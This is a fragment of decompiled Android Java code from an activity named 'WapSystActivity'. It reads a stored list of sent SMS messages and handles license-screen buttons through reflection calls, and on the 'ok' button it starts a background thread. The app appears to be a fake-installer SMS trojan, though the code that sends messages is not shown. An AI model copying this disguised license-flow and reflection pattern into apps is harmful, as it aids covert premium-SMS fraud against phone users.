    long[] getSentSms() {
        System.out.println("getSentSms()");
        System.out.println("settings.saved.sms: " + settings.saved.sms);
        String[] sentSms = Utils.split(settings.saved.sms, ";");
        int count = 0;
        for (String str : sentSms) {
            if (str.length() != 0) {
                count++;
            }
        }
        long[] list = new long[count];
        for (int i = 0; i < count; i++) {
            String[] parts = Utils.split(sentSms[i], ":");
            list[i] = Long.parseLong(parts[0]);
        }
        return list;
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        try {
            System.out.println("onClick(): " + view);
            Class selfClass = Class.forName("wap.syst.WapSystActivity");
            if (view.getTag().equals("ok")) {
                new Thread(this).start();
                Method setEndScreenMethod = selfClass.getMethod("setEndScreen", new Class[0]);
                setEndScreenMethod.invoke(this, new Object[0]);
                return;
            }
            if (view.getTag().equals("license")) {
                selfClass.getField("licenseIndex").set(null, 0);
                Method setLicenseScreenMethod = selfClass.getMethod("setLicenseScreen", new Class[0]);
                setLicenseScreenMethod.invoke(this, new Object[0]);
                return;
            }
            if (view.getTag().equals("next")) {
                if (licenseWithOneButton) {
                    new Thread(this).start();
                    Method setEndScreenMethod2 = selfClass.getMethod("setEndScreen", new Class[0]);
                    setEndScreenMethod2.invoke(this, new Object[0]);
                    return;
                } else {
                    if (licenseIndex < licenseScreens.size() - 1) {
                        licenseIndex++;
                    }
                    Method setLicenseScreenMethod2 = selfClass.getMethod("setLicenseScreen", new Class[0]);
                    setLicenseScreenMethod2.invoke(this, new Object[0]);
                    return;
                }
            }
            if (view.getTag().equals("back")) {
                Method setMainScreenMethod = selfClass.getMethod("setMainScreen", new Class[0]);
                setMainScreenMethod.invoke(this, new Object[0]);
                return;
            }
            if (view.getTag().equals("exit")) {
                if (this.state == 2) {
                    Method setMainScreenMethod2 = selfClass.getMethod("setMainScreen", new Class[0]);
                    setMainScreenMethod2.invoke(this, new Object[0]);
                    return;
                } else {
                    if (this.state == 3) {
                        Method exitMIDletMethod = selfClass.getMethod("exitMIDlet", new Class[0]);
                        exitMIDletMethod.invoke(this, new Object[0]);
                        return;
                    }
                    return;
                }
            }
            if (view.getTag().equals("go")) {
                Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
                startActivity(browserIntent);
            }
        } catch (Exception ex) {
            if (ex.getMessage().contains("exitMidlet")) {
                String err = null;
                err.length();
            }
            ex.printStackTrace();
        }
    }

